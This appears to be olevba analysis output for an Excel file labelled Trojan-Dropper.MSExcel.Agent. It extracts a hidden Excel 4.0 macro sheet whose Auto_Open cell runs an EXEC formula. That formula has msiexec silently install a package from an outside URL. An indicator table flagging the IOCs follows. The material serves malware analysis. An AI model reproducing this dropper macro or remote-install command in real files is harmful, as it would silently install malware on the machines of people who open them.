olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan-Dropper.MSExcel.Agent.db
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     22 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - 
0:
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0018     31 LABEL : Cell Value, String Constant - Auto_Open len=7 ptgRef3d 
0:!A1 
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' Sheet,Reference,Formula,Value
' 
0:,A1,EXEC("msiexec.exe serf=19 skip=1 /i http://office365advance.com/update /q OnStart='c:\windows\notepad.exe'"),""
' 
0:,A2,HALT(),""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|EXEC                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|IOC       |http://office365adva|URL                                          |
|          |nce.com/update      |                                             |
|IOC       |msiexec.exe         |Executable file name                         |
|IOC       |notepad.exe         |Executable file name                         |
|Suspicious|XLM macro           |XLM macro found. It may contain malicious    |
|          |                    |code                                         |
+----------+--------------------+---------------------------------------------+

